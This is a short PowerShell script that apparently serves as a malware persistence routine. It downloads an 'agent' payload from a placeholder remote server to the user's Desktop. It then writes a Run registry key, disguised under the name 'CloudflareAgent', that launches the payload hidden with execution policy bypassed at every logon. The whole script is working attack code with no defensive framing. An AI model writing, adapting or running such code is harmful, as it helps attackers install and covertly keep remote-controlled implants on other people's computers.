# Path to persist payload (could be your agent, or a loader for it)
$payloadPath = "$env:USERPROFILE\Desktop\agent.ps1"

# Download the agent (or small loader)
Invoke-WebRequest -Uri "https://your.serverurl.com/payloads/agent.ps1" -OutFile $payloadPath

# Add Registry Key to persist
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "CloudflareAgent"
$regValue = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`""

Set-ItemProperty -Path $regPath -Name $regName -Value $regValue
